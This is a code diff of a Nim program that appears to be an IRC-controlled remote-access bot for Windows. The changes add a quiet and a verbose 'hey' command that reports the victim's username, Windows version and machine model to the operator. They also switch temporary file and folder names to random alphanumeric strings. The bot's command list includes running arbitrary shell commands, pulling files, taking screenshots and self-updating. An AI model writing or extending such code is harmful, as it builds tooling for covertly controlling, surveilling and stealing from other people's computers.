@@ -1,4 +1,4 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random, winim, bitops, alphanum
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random, winim, bitops, alphanum, sequtils
 
 let
     g_dbg* = true
@@ -337,11 +337,11 @@ proc cmd_setSendSleep(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.asy
 
 
 proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
-    randomize()
+    #randomize()
     var
         current_dir = getCurrentDir()
-        rand_dir_dame = rand(100000..999999)
-        rand_filename = rand(100000..999999)
+        rand_dir_dame = alphaNumeric(6) #rand(100000..999999)
+        rand_filename = alphaNumeric(6) #rand(100000..999999)
         scrndir = getTempDir() & $rand_dir_dame
     try:
         if not dirExists(scrndir):
@@ -402,9 +402,9 @@ proc cmd_wallpaper(event:IrcEvent, client:AsyncIrc,tokens:seq[string]) {.async.}
     try:
         discard client.privmsg(event.origin, "trying to change wallpaper")
         var url = await helper_recombine(tokens)
-        randomize()
+        #randomize()
         var
-            randint = rand(1000000..9999999)
+            randint = alphaNumeric(7) #rand(1000000..9999999)
             imagedata = updt_fetchWebsiteContent(url)
             filename = $randint
             fullpath:cstring = (getTempDir() & $randint & "\\" & filename).cstring
@@ -440,48 +440,67 @@ proc cmd_wallpaper(event:IrcEvent, client:AsyncIrc,tokens:seq[string]) {.async.}
 #     discard
 
 
-proc cmd_hey(event:IrcEvent, client:AsyncIrc) {.async.} =
+proc cmd_hey(event:IrcEvent, client:AsyncIrc, verbose:bool) {.async.} =
     var
         win_ver = "<void>"
         win_csd = "<void>"
         win_sys = "<void>"
         win_mod = "<void>"
-    
-    try:
-        var (output, _ ) = execCmdEx("cmd.exe /c ver" ,options = {poUsePath})
-        output = output.strip(chars={'\r','\n'})
-        win_ver = output
-    except OSError as e:
-        #win_ver = repr(e)
-        discard
+        finalmsg:string = ""
 
-    try:
-        var (output, _ ) = execCmdEx("cmd.exe /c wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
-        output = output.strip(chars={'\r','\n'})
-        output.stripLineEnd()
-        win_csd = output
-        win_csd.stripLineEnd()
-    except OSError as e:
-        #win_csd = repr(e)
-        discard
 
-    try:
-        var (output, _ ) = execCmdEx("cmd.exe /c wmic computersystem get Model /value" ,options = {poUsePath})
-        output = output.strip(chars={'\r','\n'})
-        output.stripLineEnd()
-        win_mod = output
-    except OSError as e:
-        #win_mod = repr(e)
-        discard
-    
-    var
-        finalmsg:string =   "heyyy v" & 
-                            $current_version & " USR: " & getEnv("USERNAME") & "\n" &
-                            " VER: [" & win_ver & "]\n" &
-                            " CSD: [" & win_csd & "]\n" &
-                            " MOD: [" & win_mod & "]\n" 
+    if verbose:
+        
+        try:
+            var (output, _ ) = execCmdEx("cmd.exe /c ver" ,options = {poUsePath})
+            output = output.strip(chars={'\r','\n'})
+            win_ver = output
+        except OSError as e:
+            #win_ver = repr(e)
+            discard
+
+        try:
+            var (output, _ ) = execCmdEx("cmd.exe /c wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
+            output = output.strip(chars={'\r','\n'})
+            output.stripLineEnd()
+            win_csd = output
+            win_csd.stripLineEnd()
+        except OSError as e:
+            #win_csd = repr(e)
+            discard
+
+        try:
+            var (output, _ ) = execCmdEx("cmd.exe /c wmic computersystem get Model /value" ,options = {poUsePath})
+            output = output.strip(chars={'\r','\n'})
+            output.stripLineEnd()
+            win_mod = output
+        except OSError as e:
+            #win_mod = repr(e)
+            discard
+
+
+     
+        finalmsg =  "heyyy v" & 
+                    $current_version & " USR: " & getEnv("USERNAME") & "\n" &
+                    " VER: [" & win_ver & "]\n" &
+                    " CSD: [" & win_csd & "]\n" &
+                    " MOD: [" & win_mod & "]\n"
+    else:
+        var
+            unames:string = ""
+            unamea:array[256,byte]
+            unamea_size:DWORD = len(unamea)
+        finalmsg = "heyy v" & $current_version & "USR: "
+
+        discard GetUserNameA(cast[LPSTR](addr unamea[0]), addr unamea_size)
+        for c in unamea:
+            if c == 0: break
+            unames &= chr(c)
+        finalmsg &= unames
+        
 
     discard helper_responseHandler(event, client, helper_setResponse(finalmsg, 0))
+
 
 
 
@@ -499,7 +518,9 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
 
     case tokens[0]:
     of "!hey":
-        discard cmd_hey(event, client)
+        discard cmd_hey(event, client, false)
+    of "!heyy":
+        discard cmd_hey(event, client, true)
     of "!lag":
         discard client.privmsg(event.origin, formatFloat(client.getLag))
     of "!excessFlood":
@@ -538,7 +559,7 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
     of "!wallpaper":
         discard cmd_wallpaper(event, client, tokens)
     of "!cmds":
-        discard client.privmsg(event.origin, "hey, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file<, update, forceupdate, sendsleep <integer>, screenshot, wallpaper <url>, cmds")
+        discard client.privmsg(event.origin, "hey, heyy, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file<, update, forceupdate, sendsleep <integer>, screenshot, wallpaper <url>, cmds")
     
 
         
